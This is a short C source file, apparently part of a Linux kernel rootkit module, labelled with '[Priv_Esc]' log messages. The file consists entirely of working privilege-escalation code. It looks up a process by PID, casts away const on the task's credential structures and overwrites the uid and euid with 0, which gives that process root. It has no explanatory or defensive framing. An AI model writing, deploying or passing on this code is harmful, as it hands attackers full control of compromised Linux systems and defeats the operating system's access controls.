#include <privilege_escalation.h>

void root_creds(struct cred *c)
{
	kuid_t new_uid = KUIDT_INIT(0);
	c->uid = new_uid;
	c->euid = new_uid;
}

struct task_struct *find_task_from_pid(int pid)
{
	struct pid *task_pid;
	struct task_struct *task;

	task_pid = find_vpid(pid);
	if (task_pid == NULL) {
		printk(KERN_INFO
		       "[Priv_Esc] - Did not find pid struct from pid %d\n",
		       pid);
		return NULL;
	}

	task = pid_task(task_pid, PIDTYPE_PID);
	return task;
}

void escalate_pid(int pid)
{
	struct task_struct *task;
	task = find_task_from_pid(pid);

	if (task != NULL) {
		printk(KERN_INFO
		       "[Priv_Esc] - Found task from pid %d, escalating\n",
		       pid);
		root_creds((struct cred *)task->cred);
		root_creds((struct cred *)task->real_cred);
	}
}